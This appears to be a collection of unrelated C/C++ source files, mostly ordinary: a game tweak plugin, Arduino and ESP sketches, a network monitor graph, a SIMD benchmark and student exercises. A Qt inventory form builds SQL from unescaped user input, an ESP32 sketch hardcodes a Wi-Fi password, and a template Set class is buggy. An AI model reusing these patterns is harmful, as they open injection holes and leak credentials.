    "#define WIN32_LEAN_AND_MEAN\n#include <Windows.h>\n#include <filesystem>\n#include <ini.h>\n\n#include \"hook_mgr.hpp\"\n#include \"resource.h\"\n#include \"plugin.hpp\"\n#include \"game_addrs.hpp\"\n\nnamespace Module\n{\n\tconstexpr std::string_view TargetFilename = \"OR2006C2C.exe\";\n\n\tconstexpr std::string_view IniFileName = \"OutRun2006Tweaks.ini\";\n\tconstexpr std::string_view LogFileName = \"OutRun2006Tweaks.log\";\n\n\tvoid init()\n\t{\n\t\tif (!DllHandle)\n\t\t\treturn;\n\n\t\tExeHandle = GetModuleHandle(nullptr);\n\n\t\t// Fetch paths of the DLL & EXE\n\t\tDllPath = Util::GetModuleFilePath(DllHandle);\n\t\tExePath = Util::GetModuleFilePath(ExeHandle);\n\n\t\t// Setup Log & INI paths, always located next to the DLL instead of the EXE\n\t\tauto dllParent = DllPath.parent_path();\n\t\tLogPath = dllParent / LogFileName;\n\t\tIniPath = dllParent / IniFileName;\n\n\t\tGame::init();\n\t}\n\n\tvoid to_log()\n\t{\n\t\t// Print some info about the users setup to log, can come in useful for debugging issues\n\t\tspdlog::info(\"EXE module (base address: {:p}):\", fmt::ptr(ExeHandle));\n\t\tspdlog::info(\"  File path: {}\", ExePath.string());\n\t\tspdlog::info(\"  Header timestamp: {}\", Util::GetModuleTimestamp(ExeHandle));\n\t\tspdlog::info(\"DLL module (base address: {:p}):\", fmt::ptr(DllHandle));\n\t\tspdlog::info(\"  File path: {}\", DllPath.string());\n\t}\n};\n\nnamespace Settings\n{\n\tvoid to_log()\n\t{\n\t\tspdlog::info(\"Settings values:\");\n\t\tspdlog::info(\" - FramerateLimit: {}\", FramerateLimit);\n\t\tspdlog::info(\" - FramerateLimitMode: {}\", FramerateLimitMode);\n\t\tspdlog::info(\" - FramerateFastLoad: {}\", FramerateFastLoad);\n\t\tspdlog::info(\" - FramerateUnlockExperimental: {}\", FramerateUnlockExperimental);\n\t\tspdlog::info(\" - VSync: {}\", VSync);\n\n\t\tspdlog::info(\" - WindowedBorderless: {}\", WindowedBorderless);\n\t\tspdlog::info(\" - WindowPosition: {}x{}\", WindowPositionX, WindowPositionY);\n\t\tspdlog::info(\" - WindowedHideMouseCursor: {}\", WindowedHideMouseCursor);\n\t\tspdlog::info(\" - DisableDPIScaling: {}\", DisableDPIScaling);\n\t\tspdlog::info(\" - AutoDetectResolution: {}\", AutoDetectResolution);\n\n\t\tspdlog::info(\" - AnisotropicFiltering: {}\", AnisotropicFiltering);\n\t\tspdlog::info(\" - TransparencySupersampling: {}\", TransparencySupersampling);\n\t\tspdlog::info(\" - ScreenEdgeCullFix: {}\", ScreenEdgeCullFix);\n\t\tspdlog::info(\" - DisableVehicleLODs: {}\", DisableVehicleLODs);\n\t\tspdlog::info(\" - DisableStageCulling: {}\", DisableStageCulling);\n\t\tspdlog::info(\" - FixZBufferPrecision: {}\", FixZBufferPrecision);\n\n\t\tspdlog::info(\" - VibrationMode: {}\", VibrationMode);\n\t\tspdlog::info(\" - VibrationStrength: {}\", VibrationStrength);\n\t\tspdlog::info(\" - VibrationControllerId: {}\", VibrationControllerId);\n\n\t\tspdlog::info(\" - SkipIntroLogos: {}\", SkipIntroLogos);\n\t\tspdlog::info(\" - DisableCountdownTimer: {}\", DisableCountdownTimer);\n\n\t\tspdlog::info(\" - FixPegasusClopping: {}\", FixPegasusClopping);\n\t\tspdlog::info(\" - FixC2CRankings: {}\", FixC2CRankings);\n\t\tspdlog::info(\" - PreventDESTSaveCorruption: {}\", PreventDESTSaveCorruption);\n\t\tspdlog::info(\" - FixLensFlarePath: {}\", FixLensFlarePath);\n\t}\n\n\tbool read(std::filesystem::path& iniPath)\n\t{\n\t\tspdlog::info(\"Settings::read - reading INI from {}\", iniPath.string());\n\n\t\tconst std::wstring iniPathStr = iniPath.wstring();\n\n\t\t// Read INI via FILE* since INIReader doesn't support wstring\n\t\tFILE* iniFile;\n\t\terrno_t result = _wfopen_s(&iniFile, iniPathStr.c_str(), L\"r\");\n\t\tif (result != 0 || !iniFile)\n\t\t{\n\t\t\tspdlog::error(\"Settings::read - INI read failed, error code {}\", result);\n\t\t\treturn false;\n\t\t}\n\t\tinih::INIReader ini(iniFile);\n\t\tfclose(iniFile);\n\n\t\tFramerateLimit = ini.Get(\"Performance\", \"FramerateLimit\", std::move(FramerateLimit));\n\t\tFramerateLimitMode = ini.Get(\"Performance\", \"FramerateLimitMode\", std::move(FramerateLimitMode));\n\t\tFramerateFastLoad = ini.Get(\"Performance\", \"FramerateFastLoad\", std::move(FramerateFastLoad));\n\t\tFramerateUnlockExperimental = ini.Get(\"Performance\", \"FramerateUnlockExperimental\", std::move(FramerateUnlockExperimental));\n\t\tVSync = ini.Get(\"Performance\", \"VSync\", std::move(VSync));\n\n\t\tWindowedBorderless = ini.Get(\"Window\", \"WindowedBorderless\", std::move(WindowedBorderless));\n\t\tWindowPositionX = ini.Get(\"Window\", \"WindowPositionX\", std::move(WindowPositionX));\n\t\tWindowPositionY = ini.Get(\"Window\", \"WindowPositionY\", std::move(WindowPositionY));\n\t\tWindowedHideMouseCursor = ini.Get(\"Window\", \"WindowedHideMouseCursor\", std::move(WindowedHideMouseCursor));\n\t\tDisableDPIScaling = ini.Get(\"Window\", \"DisableDPIScaling\", std::move(DisableDPIScaling));\n\t\tAutoDetectResolution = ini.Get(\"Window\", \"AutoDetectResolution\", std::move(AutoDetectResolution));\n\n\t\tAnisotropicFiltering = ini.Get(\"Graphics\", \"AnisotropicFiltering\", std::move(AnisotropicFiltering));\n\t\tAnisotropicFiltering = std::clamp(AnisotropicFiltering, 0, 16);\n\t\tTransparencySupersampling = ini.Get(\"Graphics\", \"TransparencySupersampling\", std::move(TransparencySupersampling));\n\t\tScreenEdgeCullFix = ini.Get(\"Graphics\", \"ScreenEdgeCullFix\", std::move(ScreenEdgeCullFix));\n\t\tDisableVehicleLODs = ini.Get(\"Graphics\", \"DisableVehicle",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"daily_ui_challenges\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "// Primeramente, dise\u00f1\u00e9 una estructura que permite almacenar cada n\u00famero con su frecuencia y la posici\u00f3n de su primera aparici\u00f3n. \n// Luego, use QuickSort para ordenar los n\u00fameros seg\u00fan su frecuencia y posici\u00f3n. Permitiendo que los n\u00fameros con mayor frecuencia \n// salgan primero y, si hay un empate, los n\u00fameros que aparecen primero en la entrada tambi\u00e9n salen primero en la salida. Finalmente, \n// se imprimen los n\u00fameros en el orden obtenido. Considero que el c\u00f3digo funciona porque QuickSort es un algoritmo eficiente que \n// ordena los n\u00fameros exactamente como se necesita para este problema.\n#include <iostream>\n#include <vector>\n#include <utility>\n\nstruct Numero {\n    int valor;\n    int cantidad;\n    int primera_aparicion;\n};\n\nint particion(std::vector<Numero>& numeros, int low, int high) {\n    Numero pivot = numeros[high];\n    int i = (low - 1);\n\n    for (int j = low; j <= high - 1; j++) {\n        if (numeros[j].cantidad > pivot.cantidad || \n            (numeros[j].cantidad == pivot.cantidad && numeros[j].primera_aparicion < pivot.primera_aparicion)) {\n            i++;\n            std::swap(numeros[i], numeros[j]);\n        }\n    }\n    std::swap(numeros[i + 1], numeros[high]);\n    return (i + 1);\n}\n\nvoid quickSort(std::vector<Numero>& numeros, int low, int high) {\n    if (low < high) {\n        int pi = particion(numeros, low, high);\n        quickSort(numeros, low, pi - 1);\n        quickSort(numeros, pi + 1, high);\n    }\n}\n\nint main() {\n    int N, C;\n    std::cin >> N >> C;\n\n    std::vector<int> entradas(N);\n    std::vector<Numero> numeros;\n\n    for (int i = 0; i < N; i++) {\n        std::cin >> entradas[i];\n        bool identificado = false;\n        for (auto &num : numeros) {\n            if (num.valor == entradas[i]) {\n                num.cantidad++;\n                identificado = true;\n                break;\n            }\n        }\n        if (!identificado) {\n            numeros.push_back({entradas[i], 1, i});\n        }\n    }\n\n    quickSort(numeros, 0, numeros.size() - 1);\n\n    for (const auto &num : numeros) {\n        for (int i = 0; i < num.cantidad; i++) {\n            std::cout << num.valor << \" \";\n        }\n    }\n\n    return 0;\n}\n",
    "/*\n\n  SD - a slightly more friendly wrapper for sdfatlib\n\n  This library aims to expose a subset of SD card functionality\n  in the form of a higher level \"wrapper\" object.\n\n  License: GNU General Public License V3\n          (Because sdfatlib is licensed with this.)\n\n  (C) Copyright 2010 SparkFun Electronics\n\n*/\n\n#include <SD.h>\n\n/* for debugging file open/close leaks\n   uint8_t nfilecount=0;\n*/\n\nFile::File(SdFile f, const char *n) {\n  // oh man you are kidding me, new() doesn't exist? Ok we do it by hand!\n  _file = (SdFile *)malloc(sizeof(SdFile));\n  if (_file) {\n    memcpy(_file, &f, sizeof(SdFile));\n\n    strncpy(_name, n, 12);\n    _name[12] = 0;\n\n    /* for debugging file open/close leaks\n       nfilecount++;\n       Serial.print(\"Created \\\"\");\n       Serial.print(n);\n       Serial.print(\"\\\": \");\n       Serial.println(nfilecount, DEC);\n    */\n  }\n}\n\nFile::File(void) {\n  _file = 0;\n  _name[0] = 0;\n  //Serial.print(\"Created empty file object\");\n}\n\n// returns a pointer to the file name\nchar *File::name(void) {\n  return _name;\n}\n\n// a directory is a special type of file\nbool File::isDirectory(void) {\n  return (_file && _file->isDir());\n}\n\n\nsize_t File::write(uint8_t val) {\n  return write(&val, 1);\n}\n\nsize_t File::write(const uint8_t *buf, size_t size) {\n  size_t t;\n  if (!_file) {\n    setWriteError();\n    return 0;\n  }\n  _file->clearWriteError();\n  t = _file->write(buf, size);\n  if (_file->getWriteError()) {\n    setWriteError();\n    return 0;\n  }\n  return t;\n}\n\nint File::availableForWrite() {\n  if (_file) {\n    return _file->availableForWrite();\n  }\n  return 0;\n}\n\nint File::peek() {\n  if (! _file) {\n    return 0;\n  }\n\n  int c = _file->read();\n  if (c != -1) {\n    _file->seekCur(-1);\n  }\n  return c;\n}\n\nint File::read() {\n  if (_file) {\n    return _file->read();\n  }\n  return -1;\n}\n\n// buffered read for more efficient, high speed reading\nint File::read(void *buf, uint16_t nbyte) {\n  if (_file) {\n    return _file->read(buf, nbyte);\n  }\n  return 0;\n}\n\nint File::available() {\n  if (! _file) {\n    return 0;\n  }\n\n  uint32_t n = size() - position();\n\n  return n > 0X7FFF ? 0X7FFF : n;\n}\n\nvoid File::flush() {\n  if (_file) {\n    _file->sync();\n  }\n}\n\nbool File::seek(uint32_t pos) {\n  if (! _file) {\n    return false;\n  }\n\n  return _file->seekSet(pos);\n}\n\nuint32_t File::position() {\n  if (! _file) {\n    return -1;\n  }\n  return _file->curPosition();\n}\n\nuint32_t File::size() {\n  if (! _file) {\n    return 0;\n  }\n  return _file->fileSize();\n}\n\nvoid File::close() {\n  if (_file) {\n    _file->close();\n    free(_file);\n    _file = 0;\n\n    /* for debugging file open/close leaks\n      nfilecount--;\n      Serial.print(\"Deleted \");\n      Serial.println(nfilecount, DEC);\n    */\n  }\n}\n\nFile::operator bool() {\n  if (_file) {\n    return  _file->isOpen();\n  }\n  return false;\n}\n\n",
    "/*\n * nload\n * real time monitor for network traffic\n * Copyright (C) 2001 - 2018 by Roland Riegel <feedback@roland-riegel.de>\n *\n * This program is free software; you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation; either version 2 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program; if not, write to the Free Software\n * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n */\n\n#include \"graph.h\"\n#include \"setting.h\"\n#include \"settingstore.h\"\n#include \"window.h\"\n\n#include <algorithm>\n\nusing namespace std;\n\nGraph::Graph()\n    : m_heightOfBars(5), m_maxDeflection(10 * 1024 * 1024 / 8)\n{\n}\n\nGraph::~Graph()\n{\n}\n\n// sets the number of the graph's vertical #-bars\nvoid Graph::setNumOfBars(unsigned int numOfBars)\n{\n    // vertically resize the graph's value list\n    m_values.resize(numOfBars);\n}\n\n// sets the height of the graph's vertical #-bars\nvoid Graph::setHeightOfBars(unsigned int heightOfBars)\n{\n    m_heightOfBars = heightOfBars;\n}\n\n// sets the maximum of the graph's bars\nvoid Graph::setMaxDeflection(unsigned long long maxDeflection)\n{\n    m_maxDeflection = maxDeflection;\n}\n\n// new traffic measurement has been made => update the graph's value list\nvoid Graph::update(unsigned long long value)\n{\n    // [new_value] = Bytes/s\n    \n    // put new value to the beginning of the list, it becomes the first #-bar\n    m_values.push_front(value);\n\n    // delete the last #-bar of the list, but keep at least one\n    if(m_values.size() > 1)\n        m_values.pop_back();\n}\n\n// calculate maximum of graph's current values\nunsigned long long Graph::calcMaxDeflection()\n{\n    list<unsigned long long>::const_iterator maxIt = max_element(m_values.begin(), m_values.end());\n    if(maxIt == m_values.end())\n        return 0;\n\n    return *maxIt;\n}\n\n// print the graph with the upper left corner at the coordinates (x, y)\nvoid Graph::print(Window& window, int x, int y)\n{\n    // cycle through through the lines\n    for(unsigned int l = 0; l < m_heightOfBars; l++)\n    {\n        window.setXY(x, y++);\n\n        // for each line cycle through the rows\n        for(list<unsigned long long>::reverse_iterator r = m_values.rbegin(); r != m_values.rend() ; r++)\n        {\n            unsigned long long trafficPerLine = m_maxDeflection / m_heightOfBars;\n            unsigned long long lowerLimit = m_maxDeflection * (m_heightOfBars - l - 1) / m_heightOfBars;\n\n            if(*r < lowerLimit)\n            {\n                window.print(' ');\n            }\n            else \n            {\n                unsigned long long restOfTraffic = *r - lowerLimit;\n\n                if(restOfTraffic >= trafficPerLine)\n                    window.print('#');\n                else if(restOfTraffic >= trafficPerLine * 7 / 10)\n                    window.print('|');\n                else if(restOfTraffic >= trafficPerLine * 3 / 10)\n                    window.print('.');\n                else\n                    window.print(' ');\n            }\n        }\n    }\n}\n\n// reset all traffic values in the graph to zero\nvoid Graph::resetTrafficData()\n{\n    int size = m_values.size();\n    m_values.clear();\n    m_values.resize(size);\n}\n\n",
    "#include \"outputstock.h\"\r\n#include \"ui_outputstock.h\"\r\n\r\noutputstock::outputstock(QWidget *parent) :\r\n    QWidget(parent),\r\n    ui(new Ui::outputstock)\r\n{\r\n    ui->setupUi(this);\r\n\r\n    //\u7981\u6b62\u7a97\u53e3\u6700\u5927\u5316\u6309\u94ae\r\n    setWindowFlags(windowFlags()&~Qt::WindowMaximizeButtonHint);\r\n\r\n    //\u7981\u6b62\u7528\u6237\u62d6\u62c9\u7a97\u53e3\u6539\u53d8\u5927\u5c0f\r\n    setFixedSize(this->width(), this->height());\r\n\r\n    //\u521d\u59cb\u5316combo box \u63a7\u4ef6\r\n    InitComboBoxFunc();\r\n}\r\n\r\noutputstock::~outputstock()\r\n{\r\n    delete ui;\r\n}\r\n\r\n//\u521d\u59cb\u5316combo box \u63a7\u4ef6\r\nvoid outputstock::InitComboBoxFunc()\r\n{\r\n    int i = 0;\r\n    QSqlQuery sqlQuery;\r\n    sqlQuery.exec(\"select * from stockdata\");\r\n\r\n    QString strid;\r\n    while(sqlQuery.next()){\r\n        strid = sqlQuery.value(0).toString();\r\n        ui->idcomBox->insertItem(i, strid);\r\n        i++;\r\n    }\r\n}\r\n\r\n\r\n\r\nvoid outputstock::on_outputBtn_clicked()\r\n{\r\n    QSqlQuery sqlQuery;\r\n    QString strid = ui->idcomBox->currentText();\r\n\r\n    if(ui->numLineEdit->text().isEmpty()){\r\n        QMessageBox::critical(this, \"Tips\", \"\u6570\u91cf\u4e0d\u80fd\u4e3a\u7a7a\uff01\");\r\n        ui->numLineEdit->setFocus();\r\n        return;\r\n    }\r\n\r\n    //\u83b7\u53d6\u6570\u636e\u8868\u4e2d\u5546\u54c1\u7f16\u53f7\u5bf9\u5e94\u7684\u6570\u91cf\r\n    QString str = QString(\"select count from stockdata where stockid=%1;\").arg(strid);\r\n    sqlQuery.exec(str);\r\n    QString strCnt;\r\n    while(sqlQuery.next()){\r\n        strCnt = sqlQuery.value(0).toString();\r\n    }\r\n    //\u83b7\u53d6\u8981\u51fa\u5e93\u7684\u6570\u91cf\r\n    QString strnum = ui->numLineEdit->text();\r\n\r\n    int tableNum = strCnt.toUInt();\r\n    int outNum = strnum.toInt();\r\n    int resNum = tableNum - outNum;\r\n\r\n    QString strres = QString::number(resNum);\r\n\r\n    //\u66f4\u65b0\u8868\u4e2d\u6570\u636e\r\n    QString curtime = QDateTime::currentDateTime().toString(\"yyyy-MM-dd HH:mm:ss\");\r\n    QString strdb = QString(\"update stockdata set count=%1,whentimeout=\\\"%2\\\" where stockid=%3\").arg(strres).arg(curtime).arg(strid);\r\n    QMessageBox::information(this, \"tips\", strdb);\r\n    if(sqlQuery.exec(strdb)){\r\n        QMessageBox::information(this, \"Tips\", \"\u6837\u54c1\u51fa\u5e93\u6210\u529f\uff01\");\r\n    }\r\n    else{\r\n        QMessageBox::information(this, \"Tips\", \"\u6837\u54c1\u51fa\u5e93\u5931\u8d25\uff01\");\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\nvoid outputstock::on_cancleBtn_clicked()\r\n{\r\n    close();\r\n}\r\n\r\n\r\nvoid outputstock::on_selectBtn_clicked()\r\n{\r\n    QString outputStockId = ui->idcomBox->currentText();\r\n    QString selectStr = QString(\"select count from stockdata where stockid=%1;\").arg(outputStockId);\r\n    //QMessageBox::information(this, \"Tips\", selectStr);\r\n\r\n    QSqlQuery selectCntQuery;\r\n    selectCntQuery.exec(selectStr);\r\n    while(selectCntQuery.next()){\r\n        QString res = selectCntQuery.value(0).toString();\r\n        //QMessageBox::information(this, \"Tips\", res);\r\n        ui->numLineEdit->setText(res);\r\n    }\r\n}\r\n\r\n",
    "#include \"intrinsic_head.hpp\"\n\n\nvoid blend()\n{\n    auto z0=set_reg<m128>((m16)10);\n    auto z1=set_reg<m128>((m16)0);\n\n    auto vec=_mm_blend_epi16(z1,z0,0xA);\n\n    print_register<m16>(vec);   \n}\n\n\nauto get_mask(m256 vec)\n{\n    int arr[8]{};\n    storeu_reg(arr,vec);\n    int mask=0;\n\n    for(size_t i=0;i<8;i++)\n    {\n        mask|=arr[i]<<i;\n    }\n    return mask;\n}\n\ntemplate<is_random_access_storage R>\nauto findmin_simd(R&& r)\n{\n    std::ranges::ref_view range=r;\n\n    int arr[8];\n\n    auto min_el=INT32_MAX;\n    auto min = set_reg<m256>(INT32_MAX);\n\n    int mainsz=(range.size()/8)*8;\n    \n\n    for(int i=0;i<mainsz;i+=8)\n    {\n         auto args = _mm256_loadu_si256((m256*) (range.data() + i));\n         min = _mm256_min_epi32(args,min);   \n    }\n\n    storeu_reg(arr,min);\n\n    for(int i=0;i<8;i++)\n    {\n        if(min_el>arr[i])\n        {\n            min_el=arr[i];\n        }\n    }\n\n    min=set_reg<m256>(min_el);\n\n    //now we will find an index that min element\n\n    int index=-1;\n    for(int i=0;i<mainsz;i+=8)\n    {\n        auto args=_mm256_loadu_si256((m256*) (range.data() + i));\n        auto mask=_mm256_cmpeq_epi32(args,min);\n        size_t zeromask= _mm256_movemask_epi8(mask);\n        if(zeromask!=0)\n        {\n            index=(__builtin_ffs(zeromask)/sizeof(int))+i; \n            break;\n        }\n    }\n\n    //handle the tail\n\n    for(int i=mainsz;i<range.size();i++)\n    {\n        if(min_el>range[i])\n        {\n            min_el=range[i];\n            index=i;\n        }\n    }\n\n    return index;\n}\n\n\ntemplate<typename R>\nvoid print(R&& r)\n{\n    std::ranges::ref_view ran=r;\n\n    for(auto i=ran.begin();i!=ran.end();i++)\n    {\n        std::cout<<*i<<\"\\n\";\n    }\n}\n\n\ntemplate<typename T>\nauto simple_find(T&& t)\n{\n    auto it=std::min_element(t.begin(),t.end());\n\n    return it-t.begin();\n}\n\n\ntemplate<typename F,typename...Args>\nauto time(F&& f,Args&&...args)\n{\n    const auto start{std::chrono::high_resolution_clock::now()};\n    std::invoke(std::forward<F>(f),std::forward<Args>(args)...);\n    const auto end{std::chrono::high_resolution_clock::now()};\n\n   auto elapsed_time= std::chrono::duration_cast<std::chrono::milliseconds> (end-start);\n\n   return elapsed_time;\n}\n\nint main()\n{\n     size_t sz=1'000'000'0;\n\n     std::vector<int> v(sz);\n\n     std::random_device rd;\n     std::mt19937 g(rd());\n\n     for(auto &i:v)\n     {\n        i=g();\n     }\n\n\n    std::shuffle(v.begin(),v.end(),g);\n\n\n    std::cout<<\"simd find time:\"<<time(findmin_simd<std::vector<int>&>,v)<<\"\\n\";\n\n    std::cout<<\"simple_find time:\"<<time(simple_find<std::vector<int>&>,v)<<\"\\n\";\n\n\n    return 0;\n}\n",
    "#include <cstddef>\n#include \"web.h\"\n#include \"datahandler.h\"\n#include \"config.h\"\n#include <HardwareSerial.h>\n#include <ESP8266WebServer.h>\n\nextern CLUSTER_DATA cluster_data;\nextern uint8_t shift_values;\n\nESP8266WebServer server(HTTP_PORT); \n\nvoid addRoutes() {\n  server.on(\"/updateTelemetry\", updateTelemetry);\n  server.on(\"/shiftState\", shiftState);\n  server.begin();\n}\n\nvoid updateTelemetry() {\n  for (int i = 0; i < server.args(); i++) {\n    switch (server.argName(i)[0]) {\n      case 's':\n      {\n        updateSpeedoDelay(atoi(server.arg(i).c_str()));\n        break;\n      }\n      case 't':\n      {\n        updateTachoDelay(atoi(server.arg(i).c_str()));\n        break;\n      }\n      case 'f':\n      {\n        updateFuelAnalogVal(atoi(server.arg(i).c_str()));\n        break;\n      }\n    }\n  }\n  String response = \n    \"Speedo: \" + (String)cluster_data.speedoDelay +\n    \"\\nTacho: \" + (String)cluster_data.tachoDelay +\n    \"\\nFuel: \" + (String)cluster_data.fuelAnalogVal;\n  \n  server.send(200, \"text/plain\", response);\n  \n} \n\nvoid shiftState() {\n  String bitstate = \"\";\n  for(int i = 0; i < 8; i++) {\n    bitstate += bitRead(shift_values, i);\n  }\n  server.send(200, \"text/plain\", bitstate);\n}\n\nvoid handleClient() {\n  server.handleClient();\n}\n",
    "#include <WiFi.h>\n#include <HTTPClient.h>\n#include <map>\n\nconst char *ssid = \"F11Pro\";\nconst char *password = \"1144114411\";\nconst char *firestoreHost = \"firestore.googleapis.com\";\nconst int firestorePort = 443;\nconst char *firestoreProjectID = \"customesp32\";\nconst char *firestoreCollectionID = \"parkData\";\nconst char *firestoreDocumentID = \"UnivPark\"; \nconst char *firestoreAPIKey = \"your api key\";\n\nvoid sendDataToFirestore(); \n\nstruct MyData\n{\n  int key;\n  bool value;\n};\n\nMyData myData[] = {\n  {1, true},\n  {2, false},\n  {3, true},\n  {4, false},\n  {5, true},\n  {6, false},\n};\n\nvoid setup()\n{\n  Serial.begin(115200);\n\n  // Connect to Wi-Fi\n  WiFi.begin(ssid, password);\n  while (WiFi.status() != WL_CONNECTED)\n  {\n    delay(1000);\n    Serial.println(\"Connecting to WiFi...\");\n  }\n  Serial.println(\"Connected to WiFi\");\n\n  sendDataToFirestore();\n}\n\nvoid loop()\n{\n}\n\nvoid sendDataToFirestore()\n{\n  HTTPClient http;\n\n  // Construct Firestore URL with document ID\n  String url = \"https://\" + String(firestoreHost) + \"/v1/projects/\" + String(firestoreProjectID) + \"/databases/(default)/documents/\" + String(firestoreCollectionID) + \"/\" + String(firestoreDocumentID) + \"?key=\" + String(firestoreAPIKey);\n  \n  // Construct Firestore JSON data with map data\n  String data = \"{\\\"fields\\\": {\\\"parkData\\\": {\\\"mapValue\\\": {\\\"fields\\\": {\";\n\n  int myDataSize = sizeof(myData) / sizeof(myData[0]);\n  for (int i = 0; i < myDataSize; i++) {\n    data += \"\\\"\" + String(myData[i].key) + \"\\\": {\\\"stringValue\\\": \\\"\" + (myData[i].value ? \"true\" : \"false\") + \"\\\"}\";\n    if (i < myDataSize - 1) {\n      data += \",\";\n    }\n  }\n\n  data += \"}}}}}\";\n\n  Serial.println(\"JSON Payload:\");\n  Serial.println(data);\n\n  http.begin(url);\n  http.addHeader(\"Content-Type\", \"application/json\");\n  int httpResponseCode = http.PATCH(data); \n\n  if (httpResponseCode > 0)\n  {\n    Serial.print(\"HTTP Response code: \");\n    Serial.println(httpResponseCode);\n    String response = http.getString();\n    Serial.println(response);\n  }\n  else\n  {\n    Serial.print(\"Error code: \");\n    Serial.println(httpResponseCode);\n  }\n  \n  http.end();\n}\n",
    "//\n//  main.cpp\n//  \u043a\u043f4-5\n//\n//  Created by \u0410\u043b\u0435\u043a\u0441\u0430\u043d\u0434\u0440 \u0426\u044b\u043f\u043b\u0430\u043a\u043e\u0432 on 02.12.2022.\n//\n\n#include <iostream>\n#include <set>  // \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u0447\u043d\u044b\u0439 \u0444\u0430\u0439\u043b \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\n#include <iterator>\n#include <cstdlib>\nusing namespace std;\ntemplate<typename T>\nclass Set{\npublic:\n    T* array;\n    size_t size;\n    size_t capacity;\n    \n    //\u043f\u0443\u0441\u0442\u043e\u0439 \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\n    Set(){\n        array = new T[1];\n        size = 0;\n        capacity = 1;\n    }\n    \n    \n    //\u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u044f\n    Set(initializer_list<T>& lst){\n        size = lst.size();\n        capacity = 2 * size;\n        array = new T[capacity];\n        \n        for (size_t i = 0; i < size;i++) {\n            array[i] = *(lst.begin() + i);\n        }\n    }\n    \n    \n    Set(const Set& s){ // \u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n        size = s.size; //\u043a\u043e\u043f\u0438\u0440\u0443\u0435\u043c \u0440\u0430\u0437\u043c\u0435\u0440\u043d\u043e\u0441\u0442\u044c \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u0430\n        array = new int[size];\n        memcpy(array, s.array, sizeof(int) * size); //\u043a\u043e\u043f\u0438\u0440\u0443\u0435\u043c \u0434\u0430\u043d\u043d\u044b\u0435\n    }\n    \n    \n    // \u0444\u0443\u043d\u043a\u0446\u0438\u0438 \u0447\u043b\u0435\u043d\u044b \u043a\u043b\u0430\u0441\u0441\u0430\n    size_t getSize() const{ // \u0440\u0430\u0437\u043c\u0435\u0440\u043d\u043e\u0441\u0442\u044c \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u0430\n        return size;\n    }\n    \n   \n    void insert(const T element) { // \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d\u0438\u0435 \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u0430\n        if (size >= capacity) memory();\n        array[size] = element;\n        size += 1;\n    }\n    \n    \n    bool exclude(T n){ // \u0443\u0434\u0430\u043b\u0438\u0442\u044c \u044d\u043b\u0435\u043c\u0435\u043d\u0442\n        if(this->isInSet(n).first){\n            size_t position = isInSet(n).second;\n            for (size_t i = position + 1; i < size; i++) {\n                array[i - 1] = array[i];\n            }\n            --size;\n            return true;\n        }\n        else{\n            return false;\n        }\n    }\n    \n    \n    bool isEmpty(){ //\u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043f\u0443\u0441\u0442\u043e\u0442\u0443\n        return size;\n    }\n    \n    pair<bool, size_t> isInSet(T n){// \u0435\u0441\u0442\u044c \u0442\u0430\u043a\u043e\u0439 \u044d\u043b\u0435\u043c\u0435\u043d\u0442?\n        for (size_t i = 0; i < size; i++) //\u0438\u0449\u0435\u043c \u0441\u0438\u043c\u0432\u043e\u043b \u0432 \u043c\u0430\u0441\u0441\u0438\u0432\u0435\n            if (array[i] == n) return make_pair(true, i);\n        return make_pair(false, -1);\n    }\n    \n    \n    // \u043e\u043f\u0435\u0440\u0430\u0442\u043e\u0440\u044b \u0447\u043b\u0435\u043d\u044b \u043a\u043b\u0430\u0441\u0441\u0430\n    Set& operator = (const Set& s){ // \u043f\u0440\u0438\u0441\u0432\u0430\u0438\u0432\u0430\u043d\u0438\u0435 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\n        //\u0430\u043d\u0430\u043b\u043e\u0433\u0438\u0447\u043d\u043e \u043a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440\u0443 \u043a\u043e\u043f\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\n        size = s.size;\n        array = new int[size];\n        memcpy(array, s.array, sizeof(int) * size);\n        return *this;\n    }\n    \n    \n    // \u0432\u044b\u0434\u0435\u043b\u0435\u043d\u0438\u0435 